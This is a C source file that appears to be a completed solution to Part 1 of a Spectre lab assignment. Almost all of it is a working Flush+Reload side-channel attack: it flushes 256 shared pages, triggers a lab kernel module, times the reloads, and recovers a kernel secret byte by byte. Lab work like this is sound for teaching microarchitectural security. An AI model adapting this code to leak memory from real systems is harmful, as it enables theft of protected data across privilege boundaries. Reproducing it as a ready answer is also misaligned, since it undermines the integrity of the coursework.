/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define CACHE_HIT_THRESHOLD 105
#define NUM_TRIALS 1000

static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;
    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * flush_shared_memory
 * Flushes all 256 pages of the shared memory region from the cache.
 * Must be done before each kernel call so we get a clean Flush+Reload signal.
 */
static void flush_shared_memory(char *shared_memory) {
    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
    }
}

/*
 * reload_and_score
 * Times access to each of the 256 pages and accumulates hit scores.
 * Iterates in a scrambled order to avoid hardware prefetcher bias.
 *
 * Arguments:
 *  - shared_memory: the shared memory region
 *  - scores: array of 256 ints to accumulate hits into
 */
static void reload_and_score(char *shared_memory, int *scores) {
    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        int idx = ((i * 167) + 13) % SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES;
        uint64_t t = time_access(&shared_memory[idx * SHD_SPECTRE_LAB_PAGE_SIZE]);
        if (t < CACHE_HIT_THRESHOLD) {
            scores[idx]++;
        }
    }
}

/*
 * leak_byte
 * Leaks a single byte of the kernel secret at the given offset using
 * Flush+Reload over NUM_TRIALS trials.
 *
 * Arguments:
 *  - kernel_fd: file descriptor to the kernel module
 *  - shared_memory: shared memory region (256 pages)
 *  - offset: byte offset into the secret to leak
 *
 * Returns: the leaked byte value
 */
static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset) {
    int scores[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};

    for (int trial = 0; trial < NUM_TRIALS; trial++) {
        flush_shared_memory(shared_memory);
        call_kernel_part1(kernel_fd, shared_memory, offset);
        __asm__ volatile("mfence" ::: "memory");
        reload_and_score(shared_memory, scores);
    }

    unsigned char best = 0;
    for (int i = 1; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        if (scores[i] > scores[best]) {
            best = (unsigned char)i;
        }
    }
    return best;
}

int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    // Initialize shared memory (touches + flushes all pages to avoid TLB misses)
    init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1; current_offset++) {
        unsigned char leaked_byte = leak_byte(kernel_fd, shared_memory, current_offset);

        printf("[+] Offset %zu: 0x%02x ('%c')\n",
               current_offset,
               leaked_byte,
               (leaked_byte >= 32 && leaked_byte < 127) ? leaked_byte : '.');

        leaked_str[current_offset] = (char)leaked_byte;

        if (leaked_byte == '\x00') {
            break;
        }
    }
    leaked_str[current_offset] = '\0';

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}